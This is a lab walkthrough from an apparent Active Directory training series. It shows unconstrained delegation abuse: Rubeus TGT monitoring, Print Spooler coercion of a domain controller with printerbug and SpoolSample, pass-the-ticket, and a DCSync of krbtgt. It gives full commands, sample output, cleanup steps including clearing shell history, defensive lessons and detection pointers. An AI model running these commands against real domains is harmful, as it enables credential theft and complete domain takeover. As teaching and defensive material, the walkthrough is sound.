# 09 — Unconstrained Delegation Abuse (T1550.003 / T1187)

A host configured for **unconstrained delegation** is trusted to act as any user who authenticates to it: when a user connects, the user's full TGT is placed in the host's LSA memory so the host can replay it to any back-end service on the user's behalf. If an attacker controls such a host, they can harvest every TGT cached on it. The lethal combination is **coercion**: by forcing a Domain Controller to authenticate to the attacker-controlled delegation host (using the Print Spooler "printerbug"), the attacker captures the *DC's own machine-account TGT*. A DC's machine TGT can then be used to DCSync the domain. This walkthrough abuses `cersei.lannister` (the `sevenkingdoms.local` account/host flagged for unconstrained delegation), monitors for incoming TGTs with Rubeus, coerces `kingslanding` via SpoolSample, captures `KINGSLANDING$`'s TGT, and pivots to DCSync.

**MITRE ATT&CK Technique**: [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/) (primary), with [T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/) for the spooler coercion.

## Prerequisites
- Control of a host/account configured with unconstrained delegation. This lab uses `cersei.lannister` in `sevenkingdoms.local` (her host carries the `TRUSTED_FOR_DELEGATION` `userAccountControl` flag). You need administrative/SYSTEM access on that host to read tickets from LSA — assume it was compromised via an earlier attack (e.g. PtH from attack 05).
- The Print Spooler service running on the target DC `kingslanding` (192.168.56.10) — enabled in this lab on the DCs.
- Network reachability from the delegation host to the DC over MS-RPRN (printerbug) and from the DC back to the delegation host over Kerberos.

## Tools
- Rubeus v2.3.2 — run on the unconstrained-delegation host (the `cersei.lannister` host) to monitor/capture TGTs.
- `SpoolSample.exe` (or Impacket `printerbug.py`) — coercion. SpoolSample from the delegation host; `printerbug.py` from the Linux attacker (192.168.56.1).
- Mimikatz 2.2.0 — run on the delegation host to pass-the-ticket and (optionally) DCSync.
- Impacket v0.12.0 (`secretsdump.py`) — Linux attacker, to DCSync with the captured ticket.

## Step-by-step Commands

### Step 1 — (Linux attacker, 192.168.56.1) Confirm the unconstrained-delegation host
Identify accounts/computers trusted for unconstrained delegation before abusing them.
```bash
# UAC bit 0x80000 = TRUSTED_FOR_DELEGATION
findDelegation.py {{DOMAIN}}/arya.stark:'{{LAB_PASSWORD}}' -dc-ip {{DC_IP}}
# {{DOMAIN}} = sevenkingdoms.local, {{DC_IP}} = 192.168.56.10, {{LAB_PASSWORD}} = Password123!
```

### Step 2 — (cersei.lannister host) Start Rubeus monitoring for inbound TGTs
Run as SYSTEM. `monitor` polls LSA for new tickets every `/interval` seconds and base64-dumps any captured TGT.
```powershell
cd C:\Tools\Rubeus
.\Rubeus.exe monitor /interval:5 /filter:krbtgt /nowrap
# leave this running; it prints captured TGTs as they arrive
```

![Step 1](../screenshots/attack-9-step-1.png)

### Step 3 — (Linux attacker, 192.168.56.1) Coerce the DC to authenticate (printerbug)
Force `kingslanding` to connect back to the delegation host. The DC's machine account authenticates with Kerberos, depositing `KINGSLANDING$`'s TGT into the delegation host's LSA — where Rubeus catches it.
```bash
# printerbug.py <auth-domain>/<auth-user>:<pass>@<TARGET DC> <LISTENER = delegation host>
printerbug.py {{DOMAIN}}/arya.stark:'{{LAB_PASSWORD}}'@192.168.56.10 cersei.sevenkingdoms.local
```
Equivalent from the delegation host with SpoolSample:
```powershell
# SpoolSample.exe <TARGET DC> <CAPTURE host = this delegation host>
.\SpoolSample.exe kingslanding.sevenkingdoms.local cersei.sevenkingdoms.local
```

![Step 2](../screenshots/attack-9-step-2.png)

### Step 4 — (cersei.lannister host) Capture the DC TGT and import it
Rubeus prints the `KINGSLANDING$` TGT. Copy the base64 blob and re-inject it with `ptt`.
```powershell
.\Rubeus.exe ptt /ticket:doIF...<base64 from monitor output>...==
klist
```

![Step 3](../screenshots/attack-9-step-3.png)

### Step 5 — (cersei.lannister host) Pivot: DCSync using the DC's machine TGT
A DC machine account holds replication rights, so its TGT can DCSync the domain. Use Mimikatz pass-the-ticket then `dcsync`, or hand the ticket to Impacket.
```powershell
# In-session with the injected KINGSLANDING$ TGT:
.\mimikatz.exe "lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt" exit
```
Or from Linux with the exported ticket:
```bash
export KRB5CCNAME=kingslanding.ccache   # convert via Rubeus->base64->ticketConverter.py if needed
secretsdump.py -k -no-pass {{DOMAIN}}/'KINGSLANDING$'@kingslanding.sevenkingdoms.local -just-dc-user krbtgt
```

![Step 4](../screenshots/attack-9-step-4.png)

## Expected Output

`findDelegation.py` (Step 1):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

AccountName       AccountType  DelegationType              DelegationRightsTo
----------------  -----------  --------------------------  ------------------
cersei.lannister  Person       Unconstrained               N/A
CERSEI$           Computer     Unconstrained               N/A
```

Rubeus `monitor` capturing the DC TGT (Steps 2-3):
```text
  v2.3.2

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 5/20/2026 9:48:11 AM UTC - Found new TGT:

  User                  :  KINGSLANDING$@SEVENKINGDOMS.LOCAL
  StartTime             :  5/20/2026 9:48:09 AM
  EndTime               :  5/20/2026 7:48:09 PM
  RenewTill             :  5/27/2026 9:48:09 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFujCCBbagAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoRUbE1NFVkVOS0lOR0RP
    TVMuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE3NldmVua2luZ2RvbXMubG9jYWyjggR5
    ...<snip>...
    Q0FTVEVMQkxBQ0sktYI=
```

`klist` after re-injecting the DC TGT (Step 4):
```text
Cached Tickets: (1)

#0>     Client: KINGSLANDING$ @ SEVENKINGDOMS.LOCAL
        Server: krbtgt/SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent
        Start Time: 5/20/2026 9:48:09 (local)
        End Time:   5/20/2026 19:48:09 (local)
```

DCSync via the captured DC TGT (Step 5):
```text
mimikatz # lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt
SAM Username         : krbtgt
Object Relative ID   : 502

Credentials:
  Hash NTLM: b4f1c8d2e6a90573c1e8b2d4f6a0c9e3
* Primary:Kerberos-Newer-Keys *
      aes256_hmac       (4096) : 7c3e9a1b5d8f2046e1c4a8b6d2f0c7e539a1c8f4b6e2d9075c3a8f1e4b6d290c5
```

## Cleanup Steps
- On the `cersei.lannister` host: stop the Rubeus `monitor` (Ctrl-C) and `klist purge` to evict the captured `KINGSLANDING$` TGT. Remove `SpoolSample.exe` if dropped.
- On the Linux attacker: `unset KRB5CCNAME`, `rm -f kingslanding.ccache`, clear shell history.
- The printerbug coercion left a failed/odd print-job artifact on the DC's spooler queue — harmless, but you may clear the spooler queue on `kingslanding`. No directory objects were modified.
- The captured TGT expires naturally (10h). Do not reset `KINGSLANDING$` or `krbtgt`.

## What This Tells You About AD
Unconstrained delegation is the most dangerous delegation setting because it grants a host the *user's full, reusable TGT* rather than a scoped service ticket — turning any compromise of that host into impersonation of every account that ever authenticates to it. Combined with forced authentication (the Print Spooler bug, which lets any domain user coerce a remote machine — including a DC — into authenticating outbound), it becomes a one-shot domain-takeover primitive: coerce the DC, catch its machine TGT, and the DC's own replication rights hand you `krbtgt`. The defensive lessons stack: (1) eliminate unconstrained delegation entirely — use constrained or resource-based constrained delegation, and mark sensitive accounts `Account is sensitive and cannot be delegated` / add them to **Protected Users**; (2) disable the Print Spooler on Domain Controllers and tiered servers to kill the coercion vector; (3) monitor for `TRUSTED_FOR_DELEGATION` computer objects and treat them as Tier-0; and (4) watch for DC machine accounts authenticating to non-DC hosts — a DC's TGT should never land in a member host's LSA.

## Detection Reference
See [../detection/kql-queries.md#9-unconstrained-delegation-abuse](../detection/kql-queries.md#9-unconstrained-delegation-abuse) for the coercion + delegation signatures (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` spooler activity, Event ID 4768 TGT requests for a DC machine account followed by that DC authenticating to a non-DC host, Event ID 4624 Type 3 logons by `KINGSLANDING$` on the `cersei` host, and presence of `TRUSTED_FOR_DELEGATION` objects).

---
Last updated: 2026-05-17

MITRE references:
- [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [TA0008 — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
